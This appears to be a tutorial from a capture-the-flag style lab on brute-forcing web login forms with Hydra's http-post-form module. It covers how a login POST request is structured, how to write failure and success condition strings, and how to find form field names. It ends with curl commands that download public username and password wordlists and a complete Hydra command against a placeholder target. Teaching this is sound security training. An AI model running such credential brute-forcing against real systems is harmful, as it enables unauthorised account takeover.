# Login Forms

Beyond basic HTTP authentication, many web applications use custom login forms for authentication. While visually diverse, they share common mechanics exploitable through brute forcing.

## Understanding Login Forms

Login forms are HTML forms with input fields for username and password, plus a submit button. When submitted, they send a POST request with the credentials.

### Basic Login Form Example

```html
<form action="/login" method="post">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username"><br><br>
    <label for="password">Password:</label>
    <input type="password" id="password" name="password"><br><br>
    <input type="submit" value="Submit">
</form>
```

The corresponding POST request:

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

## Hydra's http-post-form Module

Hydra's `http-post-form` service automates POST requests, inserting username and password combinations into the request body.

**General syntax:**
```bash
hydra [options] target http-post-form "path:params:condition_string"
```

### Condition Strings

**Failure Condition (`F=`)**: Marks login as failed if a specific string appears in the response.
```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

**Success Condition (`S=`)**: Marks login as successful based on HTTP status or response content.
```bash
# HTTP 302 redirect
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Specific page content
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

## Gathering Form Intelligence

### Manual Inspection

Right-click and select "Inspect" to view the form's HTML structure. Identify:
- Method (POST)
- Field names (e.g., `username`, `password`)

### Browser Developer Tools

1. Open Developer Tools (F12)
2. Navigate to the **Network** tab
3. Submit a test login attempt
4. Review the POST request details, including form data and headers

### Proxy Interception

Use Burp Suite or OWASP ZAP to intercept and analyze login requests in detail.

## Constructing the Params String

The params string contains key-value pairs mimicking a form submission:

```bash
/path:field1=^USER^&field2=^PASS^:F=error_message
```

**Example**: For a form at `/` with fields `username` and `password`, showing "Invalid credentials" on failure:

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

## Executing the Attack

Download wordlists:
```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

Run Hydra:
```bash
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Once credentials are found, log in and retrieve the flag.
